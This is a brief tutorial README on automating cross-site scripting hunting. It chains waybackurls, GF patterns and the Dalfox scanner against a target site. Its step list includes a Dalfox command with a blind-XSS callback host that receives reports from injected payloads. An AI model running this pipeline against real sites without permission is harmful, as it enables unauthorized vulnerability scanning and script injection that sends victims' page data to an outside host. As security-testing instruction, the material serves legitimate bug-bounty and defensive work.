# Automate XSS using Dalfox, WaybackURL, GF Patterns.

<b> Make sure you have Go installed on your Machine </b> 

### To Install Go on your Machine:

```
sudo apt install -y golang
export GOROOT=/usr/lib/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
source .bashrc
```

## How to Hunt XSS using Dalfox? 

- Use Waybackurls by Tomnomnom to Fetch URLS for Specific Target
- Use GF patterns to find XSS Vulnerable URL's
- Use Dalfox to find XSS.

* Steps :
```
   1) waybackurls target.com >> tee urls.txt
   2)cat urls.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u |tee Possible_xss.txt 
   3)dalfox file Possible_xss.txt -b xsshunterpyload.xss.ht pipe
```


Find Script here : [QuickXSS](https://github.com/theinfosecguy/QuickXSS)


If you have any Questions, Reach out to me via [Twitter](https://twitter.com/g0t_rOoT_)
## Twitter : [Fani Malik](https://twitter.com/fanimalikhack)
